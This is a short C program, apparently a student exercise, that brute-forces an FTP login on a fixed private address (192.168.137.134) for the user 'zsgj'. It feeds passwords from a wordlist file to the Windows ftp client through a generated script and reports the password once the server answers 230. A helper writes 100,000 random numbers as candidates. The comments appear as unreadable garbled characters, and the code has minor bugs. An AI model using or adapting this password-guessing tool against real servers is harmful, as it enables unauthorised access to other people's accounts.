#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<conio.h>
#include<time.h>

#define N 100000

//ʹ��Windows��CMD��ftpһ��Linux������������Կ�ļ�ȥ�Զ���������

/*
	1�� ���ɸ�ʽ�õ���Կ�ļ�
	2�� ���ӷ��������бȶ�
	3�� ��ȡ���
*/

//����100000����������ļ�
void ranNumber2() {
	FILE* fp = fopen("rp.txt", "w");
	srand((unsigned int)time(NULL));
	for (int i = 0; i < N; i++) {
		fprintf(fp, "%d\n", rand() % 100000);
	}
	fclose(fp);
}

//���ɸ�ʽ�õ���Կ�ļ�
void createPasswdFile(char* ip, char*pass) {
	/* �����ļ���ʽ
		1��open 192.168.137.134
		2��user
		3��zsgj
		4��passwd
		5��bye
	*/

	FILE* fp2 = fopen("miyao.txt", "w");
	if (!fp2)
		return -1;
	
	fprintf(fp2, "open %s\nuser\nzsgj\n%sbye\n", ip, pass);

	fclose(fp2);
	return 0;
}

int main() {
	//ip��ַ��192.168.137.134	
	char* ip = "192.168.137.134";
	
	//���룺��ȡ�ļ������ɺõĴ����������
	FILE* fp1 = fopen("r.txt", "r");
	if (!fp1)
		return -1;

	char pass[20];

	while (!feof(fp1)) {
		memset(pass, 0, 20);
		fgets(pass, 20, fp1);
		//printf("%s", pass);

		createPasswdFile(ip, pass);
		//�������������ݵ��ļ�
		FILE* fp3 = _popen("ftp -n -s:D:\\Studies\\C\\test\\vs_test\\Project2\\miyao.txt", "r");
		if (!fp3)
			return -1;
		//�����յ��������еĵ�����ת��Ϊ��־�ļ��жϲ�ͬ����ķ���ֵ
		//FILE* fp4 = fopen("log1.txt", "w");
		//if (!fp4)
		//	return -1;

		char buf[1024];

		while (!feof(fp3)) {
			memset(buf, 0, 1024);
			fgets(buf, 1024, fp3);
			//fputs(buf, fp4);
			if (!strncmp("230", buf, 3)) {//����֮ǰ���ɵ���־�ļ�֪��230��������ȷ
				printf("���ֳɹ�\n");
				printf("����Ϊ%s\n", pass);
				exit(0);
			}
		}

		_pclose(fp3);
		//fclose(fp4);
	}

	fclose(fp1);
	return 0;
 }